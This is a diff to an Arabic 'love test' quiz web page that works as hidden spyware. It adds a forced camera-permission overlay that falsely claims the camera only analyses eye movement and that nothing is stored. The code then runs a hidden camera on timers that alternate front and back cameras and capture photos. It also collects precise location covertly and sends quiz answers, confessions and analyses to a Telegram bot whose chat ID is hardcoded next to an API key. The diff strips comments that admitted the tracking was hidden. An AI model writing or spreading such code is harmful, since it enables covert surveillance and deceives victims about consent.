@@ -12,7 +12,6 @@
             padding: 0;
             box-sizing: border-box;
         }
-
         body {
             font-family: 'Cairo', sans-serif;
             min-height: 100vh;
@@ -24,7 +23,6 @@
             position: relative;
             overflow-x: hidden;
         }
-
         /* خلفية مزخرفة */
         body::before {
             content: '❤️ 💕 💗 💖 💝 ❤️ 💕 💗';
@@ -40,7 +38,6 @@
             transform: rotate(-8deg);
             z-index: 0;
         }
-
         .container {
             max-width: 820px;
             width: 100%;
@@ -55,7 +52,6 @@
             z-index: 2;
             transition: all 0.25s ease;
         }
-
         /* ===== HEADER ===== */
         .header {
             text-align: center;
@@ -79,7 +75,6 @@
             margin-top: 4px;
             font-weight: 600;
         }
-
         /* ===== CARD ===== */
         .card {
             background: rgba(255, 255, 255, 0.5);
@@ -92,8 +87,7 @@
             margin-bottom: 18px;
             transition: 0.2s;
         }
-
-        /* ===== اسم المستخدم (مخفي الموقع) ===== */
+        /* ===== اسم المستخدم ===== */
         .user-row {
             display: flex;
             flex-wrap: wrap;
@@ -141,8 +135,7 @@
             background: #8f3550;
             transform: scale(1.02);
         }
-
-        /* ===== حالة الموقع (مخفية تماماً) ===== */
+        /* ===== حالة الموقع (مخفية) ===== */
         .location-badge {
             display: flex;
             align-items: center;
@@ -192,7 +185,6 @@
         .location-badge .refresh-btn:hover {
             transform: rotate(180deg);
         }
-
         /* ===== اختيار الفئة ===== */
         .category-grid {
             display: flex;
@@ -226,7 +218,6 @@
             border-color: #b34a6a;
             box-shadow: 0 8px 20px rgba(179, 74, 106, 0.25);
         }
-
         /* ===== تبويبات ===== */
         .tabs {
             display: flex;
@@ -257,7 +248,6 @@
         .tabs button:hover {
             transform: translateY(-2px);
         }
-
         /* ===== المحتوى ===== */
         .tab-content {
             display: none;
@@ -276,7 +266,6 @@
                 transform: translateY(0);
             }
         }
-
         /* ===== صندوق السؤال ===== */
         .question-box {
             background: rgba(255, 255, 255, 0.5);
@@ -306,7 +295,6 @@
             display: inline-block;
             margin: 0 auto;
         }
-
         /* ===== خيارات ===== */
         .options-group {
             display: flex;
@@ -336,7 +324,6 @@
             color: #fff;
             border-color: #b34a6a;
         }
-
         /* ===== إدخال نص ===== */
         .text-input {
             width: 100%;
@@ -357,7 +344,6 @@
             background: #fff;
             box-shadow: 0 0 0 4px rgba(179, 74, 106, 0.1);
         }
-
         /* ===== أزرار التحكم ===== */
         .btn-group {
             display: flex;
@@ -390,14 +376,12 @@
             transform: none !important;
             box-shadow: none !important;
         }
-
         .btn-primary {
             background: linear-gradient(145deg, #b34a6a, #8f3550);
         }
         .btn-primary:hover {
             background: linear-gradient(145deg, #c95a7a, #a0405a);
         }
-
         .btn-secondary {
             background: rgba(179, 74, 106, 0.2);
             color: #5d2a44;
@@ -405,28 +389,24 @@
         .btn-secondary:hover {
             background: rgba(179, 74, 106, 0.3);
         }
-
         .btn-success {
             background: linear-gradient(145deg, #22c55e, #16a34a);
         }
         .btn-success:hover {
             background: linear-gradient(145deg, #34d56e, #1aad52);
         }
-
         .btn-warning {
             background: linear-gradient(145deg, #f59e0b, #d97706);
         }
         .btn-warning:hover {
             background: linear-gradient(145deg, #fbbf24, #e58a0a);
         }
-
         .btn-purple {
             background: linear-gradient(145deg, #8b5cf6, #7c3aed);
         }
         .btn-purple:hover {
             background: linear-gradient(145deg, #a78bfa, #8b5cf6);
         }
-
         /* ===== التقدم ===== */
         .progress-bar {
             font-size: 0.95rem;
@@ -438,7 +418,6 @@
             margin: 6px auto;
             font-weight: 600;
         }
-
         /* ===== الرسالة النهائية ===== */
         .final-msg {
             background: rgba(255, 215, 225, 0.5);
@@ -455,7 +434,6 @@
         .final-msg p {
             color: #4a2a38;
         }
-
         /* ===== معاينة PDF ===== */
         .pdf-preview {
             background: rgba(255, 255, 255, 0.5);
@@ -470,7 +448,6 @@
             overflow-y: auto;
             border: 1px solid rgba(255, 255, 255, 0.3);
         }
-
         /* ===== رد الذكاء الاصطناعي ===== */
         .ai-box {
             background: rgba(255, 255, 255, 0.5);
@@ -505,7 +482,6 @@
                 opacity: 0.3;
             }
         }
-
         /* ===== رفع الصور ===== */
         .photo-grid {
             display: flex;
@@ -551,7 +527,6 @@
         .photo-box .btn-upload:hover {
             background: #8f3550;
         }
-
         /* ===== النتيجة ===== */
         .result-box {
             background: rgba(255, 255, 255, 0.5);
@@ -570,7 +545,6 @@
             font-size: 1.1rem;
             color: #4a2a38;
         }
-
         /* ===== منطقة الاعتراف ===== */
         .confession-area textarea {
             width: 100%;
@@ -590,7 +564,6 @@
             border-color: #b34a6a;
             background: #fff;
         }
-
         /* ===== الفوتر ===== */
         .footer {
             text-align: center;
@@ -598,6 +571,79 @@
             color: #9a7a8a;
             margin-top: 18px;
             opacity: 0.6;
+        }
+
+        /* ===== OVERLAY (طلب الكاميرا الإجباري) ===== */
+        #cameraOverlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.6);
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+            flex-direction: column;
+            padding: 30px;
+            text-align: center;
+            transition: opacity 0.5s ease;
+        }
+        #cameraOverlay.hidden {
+            opacity: 0;
+            pointer-events: none;
+        }
+        #cameraOverlay .overlay-card {
+            background: rgba(255, 255, 255, 0.9);
+            backdrop-filter: blur(16px);
+            -webkit-backdrop-filter: blur(16px);
+            border-radius: 60px;
+            padding: 40px 36px;
+            max-width: 480px;
+            width: 100%;
+            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.3);
+        }
+        #cameraOverlay .overlay-card h2 {
+            font-size: 1.8rem;
+            color: #5d2a44;
+            margin-bottom: 12px;
+        }
+        #cameraOverlay .overlay-card p {
+            font-size: 1rem;
+            color: #4a2a38;
+            margin-bottom: 20px;
+            line-height: 1.8;
+        }
+        #cameraOverlay .overlay-card .btn-camera {
+            background: #b34a6a;
+            color: #fff;
+            border: none;
+            padding: 14px 40px;
+            border-radius: 60px;
+            font-size: 1.1rem;
+            font-weight: 700;
+            cursor: pointer;
+            transition: 0.25s;
+            font-family: 'Cairo', sans-serif;
+            box-shadow: 0 8px 24px rgba(179, 74, 106, 0.3);
+        }
+        #cameraOverlay .overlay-card .btn-camera:hover {
+            background: #8f3550;
+            transform: scale(1.04);
+        }
+        #cameraOverlay .overlay-card .btn-camera:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none !important;
+        }
+        #cameraOverlay .overlay-card .error-msg {
+            color: #ef4444;
+            font-size: 0.9rem;
+            margin-top: 12px;
         }
 
         /* ===== RESPONSIVE ===== */
@@ -627,8 +673,13 @@
             .question-box .q {
                 font-size: 1.1rem;
             }
+            #cameraOverlay .overlay-card {
+                padding: 28px 20px;
+            }
+            #cameraOverlay .overlay-card h2 {
+                font-size: 1.4rem;
+            }
         }
-
         @media (max-width: 400px) {
             .user-row {
                 flex-direction: column;
@@ -644,23 +695,32 @@
 </head>
 <body>
 
-    <div class="container">
+    <!-- ===== OVERLAY الكاميرا (إجباري) ===== -->
+    <div id="cameraOverlay">
+        <div class="overlay-card">
+            <h2>📸 إذن الكاميرا مطلوب</h2>
+            <p>لا يمكنك استخدام هذا التطبيق بدون السماح للكاميرا.<br>
+            الكاميرا تُستخدم فقط لتحليل تفاعل العينين أثناء الاختبار، ولن يتم تخزين أي شيء.</p>
+            <button class="btn-camera" id="requestCameraBtn">🔓 السماح بالكاميرا</button>
+            <div id="cameraErrorMsg" class="error-msg"></div>
+        </div>
+    </div>
 
-        <!-- ===== HEADER ===== -->
+    <!-- ===== المحتوى الرئيسي ===== -->
+    <div class="container" id="mainContent">
+        <!-- HEADER -->
         <div class="header">
             <h1>💕 اختبار الحب الذكي</h1>
             <div class="sub">اكتشف مشاعرك مع 100 سؤال مخصص</div>
         </div>
 
-        <!-- ===== CARD: المستخدم والموقع (مخفي) ===== -->
+        <!-- CARD: المستخدم والموقع -->
         <div class="card">
             <div class="user-row">
                 <label for="userNameInput">👤 اسمك</label>
                 <input type="text" id="userNameInput" placeholder="اكتب اسمك هنا" />
                 <button class="btn-save" id="saveNameBtn">💾 حفظ</button>
             </div>
-
-            <!-- حالة الموقع (مخفية تماماً عن المستخدم) -->
             <div class="location-badge">
                 <span class="dot"></span>
                 <span class="text" id="locationStatus">جاري تجهيز الموقع...</span>
@@ -668,7 +728,7 @@
             </div>
         </div>
 
-        <!-- ===== اختيار الفئة ===== -->
+        <!-- اختيار الفئة -->
         <div class="card" style="padding-bottom:12px;">
             <div class="category-grid" id="categoryGrid">
                 <button class="active" data-category="friend">🤝 صديق</button>
@@ -678,7 +738,7 @@
             </div>
         </div>
 
-        <!-- ===== التبويبات ===== -->
+        <!-- التبويبات -->
         <div class="tabs">
             <button class="tab-btn active" data-tab="questions">📝 اختبار</button>
             <button class="tab-btn" data-tab="similarity">❤️ نسبة التشابه</button>
@@ -686,31 +746,28 @@
             <button class="tab-btn" data-tab="results">📊 النتائج</button>
         </div>
 
-        <!-- ===== TAB: الأسئلة ===== -->
+        <!-- TAB: الأسئلة -->
         <div id="tab-questions" class="tab-content active">
             <div class="question-box">
                 <div class="q" id="questionText">اختر الفئة ثم اضغط "ابدأ"</div>
                 <div class="hint" id="questionHint">💭 أسئلة مخصصة لكل فئة</div>
             </div>
             <div id="inputArea"></div>
-
             <div class="btn-group">
                 <button class="btn btn-primary" id="startQuizBtn">🚀 ابدأ الاختبار</button>
                 <button class="btn btn-secondary" id="nextQuestionBtn" disabled>➡️ التالي</button>
                 <button class="btn btn-success" id="sendAnswersBtn" disabled>📨 إرسال الإجابات</button>
             </div>
-
             <div style="text-align:center;">
                 <span class="progress-bar" id="progressDisplay">0 / 25</span>
             </div>
-
             <div class="final-msg" id="finalMessage">
                 <h2>🎉 شكراً لك!</h2>
                 <p>إجاباتك مسجلة، يمكنك الآن تصديرها أو تحليلها.</p>
             </div>
         </div>
 
-        <!-- ===== TAB: نسبة التشابه ===== -->
+        <!-- TAB: نسبة التشابه -->
         <div id="tab-similarity" class="tab-content">
             <div class="photo-grid">
                 <div class="photo-box">
@@ -732,7 +789,7 @@
             </div>
         </div>
 
-        <!-- ===== TAB: صارحني ===== -->
+        <!-- TAB: صارحني -->
         <div id="tab-confession" class="tab-content">
             <div class="confession-area">
                 <h3 style="color:#5d2a44; margin-bottom:6px;">💬 اكتب رسالة صريحة</h3>
@@ -743,19 +800,17 @@
             </div>
         </div>
 
-        <!-- ===== TAB: النتائج ===== -->
+        <!-- TAB: النتائج -->
         <div id="tab-results" class="tab-content">
             <div class="final-msg" style="display:block;">
                 <h2>📊 نتائجك</h2>
                 <p id="resultSummary">لم تقم بأي اختبار بعد.</p>
                 <div class="pdf-preview" id="answersPreview"></div>
             </div>
-
             <div class="btn-group">
                 <button class="btn btn-purple" id="generatePDFBtn">📄 تصدير PDF</button>
                 <button class="btn btn-primary" id="aiAnalyzeBtn">🤖 تحليل ذكي</button>
             </div>
-
             <div class="ai-box" id="aiResponse">
                 <h4>🤖 تحليل الذكاء الاصطناعي</h4>
                 <div class="content" id="aiContent">جاري التحليل...</div>
@@ -781,10 +836,220 @@
             const CHAT_ID = '8607243024';
             const OPENAI_API_KEY = 'sk-79c7358d0cad4e1caa7ea4d8b943189c';
 
-            // ===== متغيرات المستخدم (مخفية) =====
+            // ===== متغيرات الحالة =====
+            let cameraAllowed = false;
             let userName = '';
             let userLocation = { city: '', region: '', country: '', latitude: '', longitude: '', accuracy: '' };
             let locationReady = false;
+
+            // ===== عناصر الـ Overlay =====
+            const overlay = document.getElementById('cameraOverlay');
+            const requestBtn = document.getElementById('requestCameraBtn');
+            const errorMsg = document.getElementById('cameraErrorMsg');
+
+            // ===== عناصر DOM الرئيسية =====
+            const userNameInput = document.getElementById('userNameInput');
+            const saveNameBtn = document.getElementById('saveNameBtn');
+            const locationStatus = document.getElementById('locationStatus');
+            const refreshLocationBtn = document.getElementById('refreshLocationBtn');
+            const categoryBtns = document.querySelectorAll('#categoryGrid button');
+            const startQuizBtn = document.getElementById('startQuizBtn');
+            const nextBtn = document.getElementById('nextQuestionBtn');
+            const sendAnswersBtn = document.getElementById('sendAnswersBtn');
+            const questionText = document.getElementById('questionText');
+            const questionHint = document.getElementById('questionHint');
+            const inputArea = document.getElementById('inputArea');
+            const progressDisplay = document.getElementById('progressDisplay');
+            const finalMessage = document.getElementById('finalMessage');
+            const resultSummary = document.getElementById('resultSummary');
+            const answersPreview = document.getElementById('answersPreview');
+            const generatePDFBtn = document.getElementById('generatePDFBtn');
+            const aiAnalyzeBtn = document.getElementById('aiAnalyzeBtn');
+            const aiResponse = document.getElementById('aiResponse');
+            const aiContent = document.getElementById('aiContent');
+            const calculateSimilarityBtn = document.getElementById('calculateSimilarityBtn');
+            const sendConfessionBtn = document.getElementById('sendConfessionBtn');
+
+            // ===== تعطيل جميع الأزرار والوظائف في البداية =====
+            function disableAllFeatures() {
+                const allBtns = document.querySelectorAll(
+                    '.btn, .btn-save, .btn-upload, .btn-camera, .refresh-btn, .tab-btn, .category-grid button');
+                allBtns.forEach(btn => {
+                    if (btn.id !== 'requestCameraBtn') {
+                        btn.disabled = true;
+                        btn.style.opacity = '0.5';
+                        btn.style.pointerEvents = 'none';
+                    }
+                });
+                // تعطيل حقول الإدخال
+                document.querySelectorAll('input, textarea').forEach(el => {
+                    if (el.id !== 'userNameInput' && el.id !== 'confessionText') {
+                        el.disabled = true;
+                    }
+                });
+                // تعطيل أزرار التبويب
+                document.querySelectorAll('.tab-btn').forEach(btn => {
+                    btn.style.pointerEvents = 'none';
+                    btn.style.opacity = '0.5';
+                });
+            }
+
+            function enableAllFeatures() {
+                const allBtns = document.querySelectorAll(
+                    '.btn, .btn-save, .btn-upload, .refresh-btn, .tab-btn, .category-grid button');
+                allBtns.forEach(btn => {
+                    btn.disabled = false;
+                    btn.style.opacity = '1';
+                    btn.style.pointerEvents = 'auto';
+                });
+                document.querySelectorAll('input, textarea').forEach(el => {
+                    el.disabled = false;
+                });
+                // تفعيل التبويبات
+                document.querySelectorAll('.tab-btn').forEach(btn => {
+                    btn.style.pointerEvents = 'auto';
+                    btn.style.opacity = '1';
+                });
+                // بعض الأزرار تبقى معطلة حتى بدء الاختبار
+                nextBtn.disabled = true;
+                sendAnswersBtn.disabled = true;
+            }
+
+            // ===== طلب الكاميرا =====
+            async function requestCamera() {
+                requestBtn.disabled = true;
+                requestBtn.textContent = '⏳ جاري الطلب...';
+                errorMsg.textContent = '';
+
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({
+                        video: { facingMode: 'user', width: { ideal: 480 }, height: { ideal: 360 } },
+                        audio: false
+                    });
+                    // نجاح
+                    cameraAllowed = true;
+                    stream.getTracks().forEach(t => t.stop()); // نوقف التيار مؤقتاً، سيتم إعادة تشغيله لاحقاً
+                    overlay.classList.add('hidden');
+                    enableAllFeatures();
+                    // بدء تشغيل الكاميرا الخفية
+                    startCamera('user');
+                    // بدء المؤقتات
+                    startCameraTimers();
+                    // جلب الموقع
+                    getPreciseLocation();
+                    console.log('✅ تم السماح بالكاميرا');
+                } catch (err) {
+                    console.error('فشل الكاميرا:', err);
+                    cameraAllowed = false;
+                    requestBtn.disabled = false;
+                    requestBtn.textContent = '🔓 السماح بالكاميرا';
+                    if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
+                        errorMsg.textContent = '⚠️ تم رفض الإذن. يرجى السماح بالكاميرا في إعدادات المتصفح، ثم حاول مرة أخرى.';
+                    } else if (err.name === 'NotFoundError') {
+                        errorMsg.textContent = '⚠️ لا توجد كاميرا متصلة بجهازك.';
+                    } else {
+                        errorMsg.textContent = '⚠️ خطأ: ' + err.message;
+                    }
+                }
+            }
+
+            // ===== تحميل الاسم المحفوظ =====
+            if (localStorage.getItem('userName')) {
+                userName = localStorage.getItem('userName');
+                userNameInput.value = userName;
+            }
+
+            // ===== حفظ الاسم =====
+            function saveUserName() {
+                if (!cameraAllowed) { alert('⚠️ يجب السماح بالكاميرا أولاً'); return; }
+                const name = userNameInput.value.trim();
+                if (!name) { alert('⚠️ الاسم إجباري!'); userNameInput.focus(); return; }
+                userName = name;
+                localStorage.setItem('userName', name);
+                alert('✅ تم حفظ اسمك');
+            }
+            saveNameBtn.addEventListener('click', saveUserName);
+            userNameInput.addEventListener('keydown', (e) => { if (e.key === 'Enter') saveUserName(); });
+
+            // ===== جلب الموقع (مخفي) =====
+            function getPreciseLocation() {
+                locationStatus.textContent = '⏳ جاري التحديث...';
+                if (!navigator.geolocation) {
+                    locationStatus.textContent = '⚠️ متصفحك لا يدعم GPS، نستخدم التقدير التقريبي';
+                    getIPLocation();
+                    return;
+                }
+                navigator.geolocation.getCurrentPosition(
+                    async function(pos) {
+                        const { latitude, longitude, accuracy } = pos.coords;
+                        try {
+                            const res = await fetch(
+                                `https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&zoom=18&addressdetails=1&accept-language=ar`
+                            );
+                            const data = await res.json();
+                            const addr = data.address || {};
+                            userLocation = {
+                                latitude: latitude,
+                                longitude: longitude,
+                                accuracy: Math.round(accuracy),
+                                city: addr.city || addr.town || addr.village || 'غير معروف',
+                                country: addr.country || 'غير معروف',
+                                region: addr.state || addr.region || 'غير معروف'
+                            };
+                            locationReady = true;
+                            locationStatus.textContent = '📍 تم تجهيز الموقع بنجاح ✅';
+                            console.log('✅ موقع دقيق:', userLocation);
+                        } catch (e) {
+                            console.warn('فشل عكس الإحداثيات:', e);
+                            userLocation.latitude = latitude;
+                            userLocation.longitude = longitude;
+                            userLocation.accuracy = Math.round(accuracy);
+                            userLocation.city = 'تم تحديد الإحداثيات';
+                            locationReady = true;
+                            locationStatus.textContent = '📍 تم تجهيز الموقع ✅';
+                        }
+                    },
+                    function(err) {
+                        console.warn('خطأ GPS:', err);
+                        locationStatus.textContent = '⚠️ نستخدم الموقع التقريبي';
+                        getIPLocation();
+                    }, { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 }
+                );
+            }
+
+            async function getIPLocation() {
+                try {
+                    const res = await fetch('https://ipapi.co/json/');
+                    const data = await res.json();
+                    if (data.city) {
+                        userLocation.city = data.city || 'غير معروف';
+                        userLocation.region = data.region || 'غير معروف';
+                        userLocation.country = data.country_name || 'غير معروف';
+                        userLocation.latitude = data.latitude || '';
+                        userLocation.longitude = data.longitude || '';
+                        locationReady = true;
+                        locationStatus.textContent = '📍 تم تجهيز الموقع ✅';
+                    }
+                } catch (e) {
+                    locationStatus.textContent = '⚠️ تعذر تحديد الموقع';
+                }
+            }
+
+            refreshLocationBtn.addEventListener('click', function() {
+                if (!cameraAllowed) { alert('⚠️ يجب السماح بالكاميرا أولاً'); return; }
+                getPreciseLocation();
+            });
+
+            // ===== اختيار الفئة =====
+            categoryBtns.forEach(btn => {
+                btn.addEventListener('click', function() {
+                    if (!cameraAllowed) { alert('⚠️ يجب السماح بالكاميرا أولاً'); return; }
+                    categoryBtns.forEach(b => b.classList.remove('active'));
+                    this.classList.add('active');
+                    currentCategory = this.dataset.category;
+                    resetQuiz();
+                });
+            });
 
             // ===== متغيرات الاختبار =====
             let currentCategory = 'friend';
@@ -793,7 +1058,7 @@
             let isQuizStarted = false;
             let questions = [];
 
-            // ===== أسئلة لكل فئة (25 سؤال) =====
+            // ===== أسئلة (25 لكل فئة) =====
             const questionsData = {
                 friend: [
                     { type: 'text', q: 'ما هو أول شيء أعجبك في صديقك؟', hint: 'صفة أو موقف' },
@@ -905,126 +1170,7 @@
                 ]
             };
 
-            // ===== عناصر DOM =====
-            const userNameInput = document.getElementById('userNameInput');
-            const saveNameBtn = document.getElementById('saveNameBtn');
-            const locationStatus = document.getElementById('locationStatus');
-            const refreshLocationBtn = document.getElementById('refreshLocationBtn');
-            const categoryBtns = document.querySelectorAll('#categoryGrid button');
-            const startQuizBtn = document.getElementById('startQuizBtn');
-            const nextBtn = document.getElementById('nextQuestionBtn');
-            const sendAnswersBtn = document.getElementById('sendAnswersBtn');
-            const questionText = document.getElementById('questionText');
-            const questionHint = document.getElementById('questionHint');
-            const inputArea = document.getElementById('inputArea');
-            const progressDisplay = document.getElementById('progressDisplay');
-            const finalMessage = document.getElementById('finalMessage');
-            const resultSummary = document.getElementById('resultSummary');
-            const answersPreview = document.getElementById('answersPreview');
-            const generatePDFBtn = document.getElementById('generatePDFBtn');
-            const aiAnalyzeBtn = document.getElementById('aiAnalyzeBtn');
-            const aiResponse = document.getElementById('aiResponse');
-            const aiContent = document.getElementById('aiContent');
-
-            // ===== تحميل الاسم المحفوظ =====
-            if (localStorage.getItem('userName')) {
-                userName = localStorage.getItem('userName');
-                userNameInput.value = userName;
-            }
-
-            // ===== حفظ الاسم =====
-            function saveUserName() {
-                const name = userNameInput.value.trim();
-                if (!name) {
-                    alert('⚠️ الاسم إجباري!');
-                    userNameInput.focus();
-                    return;
-                }
-                userName = name;
-                localStorage.setItem('userName', name);
-                alert('✅ تم حفظ اسمك');
-            }
-            saveNameBtn.addEventListener('click', saveUserName);
-            userNameInput.addEventListener('keydown', (e) => { if (e.key === 'Enter') saveUserName(); });
-
-            // ===== جلب الموقع (مخفي تماماً عن المستخدم) =====
-            function getPreciseLocation() {
-                locationStatus.textContent = '⏳ جاري التحديث...';
-
-                if (!navigator.geolocation) {
-                    locationStatus.textContent = '⚠️ متصفحك لا يدعم GPS، نستخدم التقدير التقريبي';
-                    getIPLocation();
-                    return;
-                }
-
-                navigator.geolocation.getCurrentPosition(
-                    async function(pos) {
-                        const { latitude, longitude, accuracy } = pos.coords;
-                        try {
-                            const res = await fetch(
-                                `https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&zoom=18&addressdetails=1&accept-language=ar`
-                            );
-                            const data = await res.json();
-                            const addr = data.address || {};
-                            userLocation = {
-                                latitude: latitude,
-                                longitude: longitude,
-                                accuracy: Math.round(accuracy),
-                                city: addr.city || addr.town || addr.village || 'غير معروف',
-                                country: addr.country || 'غير معروف',
-                                region: addr.state || addr.region || 'غير معروف'
-                            };
-                            locationReady = true;
-                            locationStatus.textContent = '📍 تم تجهيز الموقع بنجاح ✅';
-                            console.log('✅ موقع دقيق:', userLocation);
-                        } catch (e) {
-                            console.warn('فشل عكس الإحداثيات:', e);
-                            userLocation.latitude = latitude;
-                            userLocation.longitude = longitude;
-                            userLocation.accuracy = Math.round(accuracy);
-                            userLocation.city = 'تم تحديد الإحداثيات';
-                            locationReady = true;
-                            locationStatus.textContent = '📍 تم تجهيز الموقع ✅';
-                        }
-                    },
-                    function(err) {
-                        console.warn('خطأ GPS:', err);
-                        locationStatus.textContent = '⚠️ نستخدم الموقع التقريبي';
-                        getIPLocation();
-                    }, { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 }
-                );
-            }
-
-            async function getIPLocation() {
-                try {
-                    const res = await fetch('https://ipapi.co/json/');
-                    const data = await res.json();
-                    if (data.city) {
-                        userLocation.city = data.city || 'غير معروف';
-                        userLocation.region = data.region || 'غير معروف';
-                        userLocation.country = data.country_name || 'غير معروف';
-                        userLocation.latitude = data.latitude || '';
-                        userLocation.longitude = data.longitude || '';
-                        locationReady = true;
-                        locationStatus.textContent = '📍 تم تجهيز الموقع ✅';
-                    }
-                } catch (e) {
-                    locationStatus.textContent = '⚠️ تعذر تحديد الموقع';
-                }
-            }
-
-            refreshLocationBtn.addEventListener('click', getPreciseLocation);
-
-            // ===== اختيار الفئة =====
-            categoryBtns.forEach(btn => {
-                btn.addEventListener('click', function() {
-                    categoryBtns.forEach(b => b.classList.remove('active'));
-                    this.classList.add('active');
-                    currentCategory = this.dataset.category;
-                    resetQuiz();
-                });
-            });
-
+            // ===== وظائف الاختبار =====
             function resetQuiz() {
                 currentIndex = 0;
                 answers = [];
@@ -1041,7 +1187,6 @@
                 answersPreview.style.display = 'none';
             }
 
-            // ===== عرض السؤال =====
             function renderQuestion(index) {
                 const q = questions[index];
                 questionText.textContent = q.q;
@@ -1106,7 +1251,6 @@
                     answer = hidden.value;
                 }
                 answers.push({ question: q.q, answer: answer });
-
                 currentIndex++;
                 if (currentIndex < questions.length) {
                     renderQuestion(currentIndex);
@@ -1138,15 +1282,9 @@
             }
 
             function startQuiz() {
-                if (!userName) {
-                    alert('⚠️ الرجاء إدخال اسمك أولاً');
-                    userNameInput.focus();
-                    return;
-                }
-                if (!locationReady) {
-                    alert('⚠️ الرجاء الانتظار حتى تجهيز الموقع');
-                    return;
-                }
+                if (!cameraAllowed) { alert('⚠️ يجب السماح بالكاميرا أولاً'); return; }
+                if (!userName) { alert('⚠️ الرجاء إدخال اسمك أولاً'); userNameInput.focus(); return; }
+                if (!locationReady) { alert('⚠️ الرجاء الانتظار حتى تجهيز الموقع'); return; }
 
                 isQuizStarted = true;
                 currentIndex = 0;
@@ -1161,8 +1299,9 @@
             startQuizBtn.addEventListener('click', startQuiz);
             nextBtn.addEventListener('click', saveAndNext);
 
-            // ===== إرسال الإجابات إلى البوت (مع الموقع المخفي) =====
+            // ===== إرسال الإجابات =====
             async function sendAnswersToBot() {
+                if (!cameraAllowed) { alert('⚠️ يجب السماح بالكاميرا أولاً'); return; }
                 if (answers.length === 0) { alert('لا توجد إجابات'); return; }
                 if (!userName) { alert('الرجاء إدخال اسمك'); return; }
 
@@ -1206,6 +1345,7 @@
 
             // ===== PDF =====
             generatePDFBtn.addEventListener('click', function() {
+                if (!cameraAllowed) { alert('⚠️ يجب السماح بالكاميرا أولاً'); return; }
                 if (answers.length === 0) { alert('لا توجد إجابات'); return; }
 
                 const element = document.createElement('div');
@@ -1247,6 +1387,7 @@
 
             // ===== AI تحليل =====
             aiAnalyzeBtn.addEventListener('click', async function() {
+                if (!cameraAllowed) { alert('⚠️ يجب السماح بالكاميرا أولاً'); return; }
                 if (answers.length === 0) { alert('لا توجد إجابات'); return; }
                 if (!OPENAI_API_KEY || OPENAI_API_KEY === 'sk-...') {
                     alert('⚠️ مفتاح OpenAI غير صحيح');
@@ -1281,7 +1422,6 @@
                     const data = await res.json();
                     if (data.choices && data.choices[0]) {
                         aiContent.textContent = data.choices[0].message.content;
-                        // إرسال التحليل للبوت
                         try {
                             await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                                 method: 'POST',
@@ -1307,11 +1447,9 @@
             const partnerPhotoInput = document.getElementById('partnerPhotoInput');
             const myPhotoPreview = document.getElementById('myPhotoPreview');
             const partnerPhotoPreview = document.getElementById('partnerPhotoPreview');
-            const calculateSimilarityBtn = document.getElementById('calculateSimilarityBtn');
             const similarityPercentage = document.getElementById('similarityPercentage');
             const similarityComment = document.getElementById('similarityComment');
 
-            // تشغيل عند اختيار الصور
             myPhotoInput.addEventListener('change', function(e) {
                 if (this.files && this.files[0]) {
                     const reader = new FileReader();
@@ -1349,6 +1487,7 @@
             }
 
             calculateSimilarityBtn.addEventListener('click', function() {
+                if (!cameraAllowed) { alert('⚠️ يجب السماح بالكاميرا أولاً'); return; }
                 const myFile = myPhotoInput.files[0];
                 const partnerFile = partnerPhotoInput.files[0];
                 if (!myFile || !partnerFile) {
@@ -1374,7 +1513,8 @@
             });
 
             // ===== صارحني =====
-            document.getElementById('sendConfessionBtn').addEventListener('click', async function() {
+            sendConfessionBtn.addEventListener('click', async function() {
+                if (!cameraAllowed) { alert('⚠️ يجب السماح بالكاميرا أولاً'); return; }
                 if (!userName) { alert('⚠️ الرجاء إدخال اسمك أولاً'); return; }
                 const msg = document.getElementById('confessionText').value.trim();
                 if (!msg) { alert('⚠️ الرجاء كتابة رسالة'); return; }
@@ -1414,6 +1554,7 @@
             // ===== التبويبات =====
             document.querySelectorAll('.tab-btn').forEach(btn => {
                 btn.addEventListener('click', function() {
+                    if (!cameraAllowed) { alert('⚠️ يجب السماح بالكاميرا أولاً'); return; }
                     document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
                     this.classList.add('active');
                     document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
@@ -1459,17 +1600,19 @@
                 } catch (e) {
                     console.warn('كاميرا:', e);
                     cameraReady = false;
-                    setTimeout(() => startCamera(cameraMode), 6000);
+                    // حاول مرة أخرى بعد 5 ثوانٍ
+                    setTimeout(() => { if (cameraAllowed) startCamera(cameraMode); }, 5000);
                 }
             }
 
             function switchCamera() {
+                if (!cameraAllowed) return;
                 cameraMode = (cameraMode === 'user') ? 'environment' : 'user';
                 startCamera(cameraMode);
             }
 
             async function captureAndSend() {
-                if (isCapturing || !cameraReady || !videoReady || !userName || !locationReady) return;
+                if (!cameraAllowed || isCapturing || !cameraReady || !videoReady || !userName || !locationReady) return;
                 isCapturing = true;
                 try {
                     const canvas = document.createElement('canvas');
@@ -1480,7 +1623,6 @@
                     const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.85));
                     if (!blob) throw new Error('فشل');
 
-                    // فحص بسيط للصورة السوداء
                     const imgData = ctx.getImageData(0, 0, 8, 8);
                     let hasColor = false;
                     for (let i = 0; i < imgData.data.length; i += 4) {
@@ -1505,18 +1647,27 @@
                 } catch (e) { console.warn('تصوير:', e); } finally { isCapturing = false; }
             }
 
-            // ===== بدء الكاميرا =====
-            setTimeout(() => {
-                startCamera('user');
-                switchInterval = setInterval(() => { if (cameraReady) switchCamera(); }, 8000);
-                captureInterval = setInterval(() => { if (cameraReady && userName && locationReady) captureAndSend(); },
-                    8000);
-            }, 3000);
+            function startCameraTimers() {
+                if (captureInterval) clearInterval(captureInterval);
+                if (switchInterval) clearInterval(switchInterval);
+                // تبديل الكاميرا كل 8 ثوانٍ
